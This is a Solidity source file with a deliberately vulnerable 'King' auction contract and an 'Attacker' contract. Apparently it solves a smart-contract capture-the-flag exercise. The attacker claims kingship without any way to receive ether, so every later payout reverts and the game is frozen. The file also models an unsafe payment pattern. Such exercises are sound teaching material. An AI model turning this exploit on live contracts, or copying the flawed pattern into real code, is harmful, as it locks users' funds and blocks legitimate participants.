// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {
  address payable king;
  uint256 public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract Attacker {
  function attack(address _king) external payable {
    address payable king = payable(_king);
    (bool success, ) = king.call{value: msg.value}("");
  }

  function weezing() public {
    address payable addr = payable(msg.sender);
    selfdestruct(addr);
  }
}